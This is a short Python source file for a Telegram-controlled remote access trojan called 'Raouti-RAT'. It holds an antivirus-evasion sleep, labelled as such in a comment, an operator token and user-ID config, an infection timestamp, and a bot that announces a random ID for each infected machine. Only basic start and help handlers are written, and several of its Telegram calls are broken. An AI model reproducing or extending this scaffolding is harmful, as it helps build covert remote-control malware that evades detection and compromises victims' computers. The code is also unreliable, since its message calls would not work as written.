import time
import random

# Small delay to make AV think we are a good boy

time.sleep(random.randint(10,15))

import os
import subprocess
import requests
import string

from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext



def get_bot_name():
    letters = string.ascii_letters
    random_string = ''.join(random.choices(letters, k=5))
    return random_string

# Config
######################

bot_token = ""
User_ID_1 = ""
User_ID_2 = ""

#####################

bot_name = get_bot_name()
mr = Update.message.reply_text

infect_time = time.time()


def start(update: Update, context: CallbackContext) -> None:
    try:
        mr(f'Raouti-RAT ')
        mr(f'Bot started with ID: {bot_name}')
        mr(f'')
    except Exception as e:
        print(f'Error starting bot , {e}')

def help_command(update: Update, context: CallbackContext) -> None:
    mr.reply_text('Available commands:\n/start - Start the bot\n/help - Get help')

def unknown_command(update: Update, context: CallbackContext) -> None:
    mr.reply_text("Sorry, I didn't understand that command.")

def main():
    
    updater = Updater(bot_token, use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("", unknown_command))

    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()